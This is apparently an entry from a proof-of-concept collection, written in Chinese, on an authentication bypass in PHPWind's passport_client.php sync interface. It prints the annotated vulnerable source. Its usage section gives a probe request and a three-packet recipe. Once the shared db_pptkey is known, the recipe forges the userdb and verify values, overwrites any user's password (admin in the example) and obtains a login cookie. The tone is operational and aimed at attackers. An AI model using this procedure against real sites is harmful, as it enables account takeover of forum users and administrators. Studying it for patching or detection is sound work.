# PHPWind passport_client.php 通行证接口：verify=md5(action+userdb+forward+db_pptkey)，可改写任意用户密码并下发登录 Cookie

- **code**: phpwind-passport_client.php-通行证接口-verify-md5-action-userdb-forward-db_pptkey-可改写
- **kind**: poc
- **category**: auth-bypass
- **component**: PHPWind passport_client.php（通行证同步接口）
- **severity**: critical
- **language**: php
- **source**: self
- **verified_note**: 7.5 SP3 源码逐行确证（此文件全 92 行已读）。7.3.2 是否同样存在该文件/同样写法未验证，但该功能属老版本固有面。目标是否开启 db_pptifopen 需按上述 1 包判定。
- **path**: pocs/phpwind-passport_client.php-通行证接口-verify-md5-action-userdb-forward-db_pptkey-可改写/poc.php
- **tags**: phpwind,passport,通行证,认证绕过,账号接管,未授权面
- **created_at**: 2026-10-06T11:40:16.190Z

## 描述

PHPWind 通行证同步客户端接口（老 PHPWind 经典面，前一份报告未覆盖）。认证只有一层：verify = md5(action . userdb . forward . $db_pptkey)，$db_pptkey 是 pw_config 里的共享密钥。通过校验后 userdb 参数（异或+base64 编码的 query string）走 parse_str，可指定 username/password/email/time，进而：① 改写任意已存在用户的 password/email（第 46 行 UPDATE pw_members）；② 用户不存在则以 groupid=-1/memberid=8 新建；③ 第 83 行直接下发 winduser 登录 Cookie（StrCode(uid."\t".PwdCode(password))）→ 账号接管。注意第 6 行 InitGP(array('userdb'),'GP',0) 的 cvtype=0 表示该参数不过 Char_cv，所以值里的引号/特殊字符可原样进入。（7.5 SP3 源码确证；8.7 未逐行比对）

## 用法

```
1 包低成本判定（不构成攻击，只探功能开关，零副作用）：
  GET /bbs/passport_client.php?action=login&forward=&verify=x&userdb=x HTTP/1.1
  Host: example.com
判定：
  返回 passport_close → passport_client.php:7 的 $db_pptifopen 为 0 或 $db_ppttype != 'client'，功能关闭 → 此路彻底死，别再投入。
  返回 passport_safe  → 功能已开启（只有 verify 不对），此时只差 pw_config.db_pptkey。
拿到 db_pptkey 后的利用（3 个包）：
  1) 本地算：$userdb = StrCode('username=admin&password=0123456789abcdef0123456789abcdef&time='.time(),'ENCODE')
     其中 StrCode 是 异或 + base64（key = substr(md5(HTTP_USER_AGENT.db_hash),8,18)）；注意此处 db_hash 用的是 $db_pptkey
  2) $verify = md5('login' . $userdb . '' . $db_pptkey)
  3) GET /bbs/passport_client.php?action=login&forward=&verify=<verify>&userdb=<userdb>
  结果：该用户 password 被改写为指定值，并返回 winduser 登录 Cookie → 账号接管。
补充：$db_pptifopen 与 $db_ppttype 都可在站点前台观察 —— 登录页若出现"通行证/同步"入口或被外部跳转（$db_pptloginurl），说明功能开启。
```

## 正文

```
// passport_client.php 全文（92 行，7.5 SP3）
1: <?php
2: require_once('global.php');
3: require_once(R_P.'require/checkpass.php');
4:
5: InitGP(array('action','forward','verify'));
6: InitGP(array('userdb'),'GP',0);                 // ★ cvtype=0 → 不过 Char_cv
7: if(!$db_pptifopen || $db_ppttype!='client'){
8: 	Showmsg('passport_close');                    // ← 功能未开则直接退出
9: }
10: if(empty($db_pptkey) || md5($action.$userdb.$forward.$db_pptkey) != $verify){
11: 	Showmsg('passport_safe');                     // ← 唯一的认证：md5(拼接,$db_pptkey)
12: }
13: $_db_hash=$db_hash;
14:
15: $db_hash=$db_pptkey;
16: parse_str(StrCode($userdb,'DECODE'),$userdb);     // ★ userdb = 异或+base64 编码的 query string
17:
18: if($action=='login'){
19: 	$userdb = Char_cv($userdb);
20: 	if(!$userdb['time'] || !$userdb['username'] || !$userdb['password']){
21: 		Showmsg('passport_data');
22: 	}
23: 	if($timestamp-$userdb['time']>3600){ Showmsg('passport_error'); }
24:
25: 	$member_field = array('username','password','email');
26: 	$memberdata_field = array('rvrc','money','credit','currency');
...
34: 	$rt=$db->get_one("SELECT uid $sql FROM pw_members WHERE username=".pwEscape($userdb['username']));
35: 	if($rt){
36: 		$sql=$sql2=array();
37: 		foreach($userdb as $key=>$val){
38: 			if(in_array($key,$member_field) && $rt[$key] != $val){ $sql[$key] = $val; }   // ★ 直接改写该用户 password/email
40: 			elseif(in_array($key,$memberdata_field) && strpos(",$db_pptcredit,",",$key,")!==false){ $sql2[$key] = $val; }
43: 		}
46: 		$db->update("UPDATE pw_members SET $sql WHERE uid=".pwEscape($rt['uid']));
50: 		$db->update("UPDATE pw_memberdata SET $sql2 WHERE uid=".pwEscape($rt['uid']));
53: 		$winduid = $rt['uid'];
54: 	} else{
55: 		// 用户不存在 → REPLACE INTO 新建用户，groupid=-1, memberid=8
63: 		$sql1 += array('groupid'=>-1,'memberid'=>8,'gender'=>0,'regdate'=>$timestamp);
69: 		$db->update("REPLACE INTO pw_members SET".pwSqlSingle($sql1));
70: 		$winduid = $db->insert_id();
78: 		$db->update("REPLACE INTO pw_memberdata SET".pwSqlSingle($sql2));
79: 		$db->update("UPDATE pw_bbsinfo SET newmember=".pwEscape($userdb['username']).",totalmember=totalmember+1 WHERE id='1'");
80: 	}
81: 	$db_hash=$_db_hash;
82: 	$windpwd = PwdCode($userdb['password']);
83: 	Cookie("winduser",StrCode($winduid."\t".$windpwd),$userdb['cktime']);   // ★ 直接下发登录 Cookie
84: 	Cookie('lastvisit','',0);
85: 	Loginipwrite();
86: 	ObHeader($forward ? $forward : $db_bbsurl);
87: } elseif($action=='quit'){
88: 	$db_hash=$_db_hash;
89: 	Loginout();
90: 	ObHeader($forward ? $forward : $db_bbsurl);
91: }
// ※ 根目录不存在 passport.php；hack/passport/ 是后台配置模块（hack/passport/example.com 只做 ifcheck($db_pptifopen,...) 写入）
```
